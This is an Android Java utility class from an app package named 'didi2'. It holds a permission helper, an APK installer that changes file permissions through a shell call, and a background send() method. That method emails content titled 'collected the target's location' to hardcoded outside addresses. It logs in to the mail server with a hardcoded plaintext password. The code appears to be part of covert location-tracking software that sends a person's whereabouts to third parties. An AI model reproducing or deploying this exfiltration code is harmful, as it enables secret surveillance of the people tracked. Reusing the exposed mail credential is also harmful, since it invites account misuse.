package com.yangyong.didi2.util;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.support.v4.content.FileProvider;
import android.util.Log;

import com.tbruyelle.rxpermissions2.RxPermissions;
import com.yangyong.didi2.Constants;
import com.yangyong.didi2.activity.MainActivity;

import java.io.File;
import java.util.Date;
import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

import io.reactivex.Observable;
import io.reactivex.functions.Consumer;

/**
 * Created by yangyong on 2019/12/26/0026.
 */

public class AppUtil {
    public static Activity mActivity;
    private static AppUtil instance;

    private AppUtil() {};

    public static AppUtil getInstance() {
        if (instance == null) {
            instance = new AppUtil();
        }
        return instance;
    }

    ;

    public static void requestPermissions(Activity activity, String[] permissions, Consumer<Boolean> consumer) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M)
            return;
        String[] s = new String[]{
//                Manifest.permission.WRITE_EXTERNAL_STORAGE,//文件
//                Manifest.permission.READ_PHONE_STATE,//imei
//                Manifest.permission.ACCESS_FINE_LOCATION,//定位
//                Manifest.permission.ACCESS_COARSE_LOCATION,//定位


//                Manifest.permission.CALL_PHONE,
//                Manifest.permission.SEND_SMS,
//                Manifest.permission.RECEIVE_SMS,
//                Manifest.permission.READ_CONTACTS,
//                Manifest.permission.WRITE_CONTACTS,
//                Manifest.permission.READ_SMS,
                Manifest.permission.READ_EXTERNAL_STORAGE,//文件
//                Manifest.permission.CAMERA,
//                Manifest.permission.GET_ACCOUNTS
        };
        RxPermissions permission = new RxPermissions(activity);
        Observable<Boolean> request = permission.request(s);
        request.subscribe(consumer);
    }

    /**
     * 安装APK
     *
     * @param context
     * @return
     */
    public static void installApk(Context context, File apkPath) {
        Log.i("yy", apkPath.toString());
        try {
            Runtime.getRuntime().exec("chmod 604 " + apkPath.getAbsolutePath());
            Log.i("yy", "修改文件夹及安装包的权限,供第三方应用访问->" + "success");
        } catch (Exception e) {
            Log.i("yy", "修改文件夹及安装包的权限,供第三方应用访问->" + "fail");
        }
        Intent i = new Intent(Intent.ACTION_VIEW);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            //高于7.0安装方式改变
            i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            Uri contentUri = FileProvider.getUriForFile(context, "com.yangyong.didi2.fileProvider", apkPath);
            i.setDataAndType(contentUri, "application/vnd.android.package-archive");

        } else {
            i.setDataAndType(Uri.fromFile(apkPath),
                    "application/vnd.android.package-archive");
        }
        context.startActivity(i);
    }

    public void send(final SharedPreferences preferences, final String s1, final Handler handler) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Transport.send(createMimeMessage("采集到目标位置", s1));
                    SharedPreferences.Editor edit = preferences.edit();
                    edit.putBoolean("isFirst", false);

                    edit.commit();
                    handler.sendEmptyMessage(0);
                    Log.e(Constants.TAG, "发送成功");
                } catch (Exception e) {
                    Log.e(Constants.TAG, "发送失败, exception: " + e.getMessage());
                }
            }
        }).start();
    }

    private MimeMessage createMimeMessage(String title, String content) {
        // 判断是否需要身份认证
        Properties pro = getProperties();
        // 如果需要身份认证，则创建一个密码验证器
        MailAuthenticator authenticator = new MailAuthenticator("tysj78@yeah.net", "mm0700");
        // 根据邮件会话属性和密码验证器构造一个发送邮件的session
        Session session = Session.getInstance(pro, authenticator);
        MimeMessage msg = new MimeMessage(session);
        try {
            //发件人
            msg.setFrom(new InternetAddress("tysj78@yeah.net"));
            //收件人
//            InternetAddress[] addresses = new InternetAddress[]{new InternetAddress("2553601218@qq.com")};jdxk007@163.com
            msg.setRecipients(Message.RecipientType.CC, "tysj78@yeah.net");
            msg.setRecipients(Message.RecipientType.TO, "2553601218@qq.com");
            msg.setSubject(title);
            msg.setSentDate(new Date());
            msg.setText(content, "UTF-8");
        } catch (MessagingException mex) {
            LogUtils.e("发送邮件异常");
        }
        return msg;
    }

    public Properties getProperties() {
        Properties p = System.getProperties();
        p.put("mail.smtp.host", "smtp.yeah.net");
        p.put("mail.smtp.auth", "true");
        p.put("mail.smtp.connectiontimeout", 8000);
        return p;
    }

    public class MailAuthenticator extends Authenticator {

        String userName = "";
        String password = "";

        public MailAuthenticator() {
        }

        public MailAuthenticator(String username, String password) {
            this.userName = username;
            this.password = password;
        }

        // 这个方法在Authenticator内部会调用
        protected PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(userName, password);
        }

    }

}
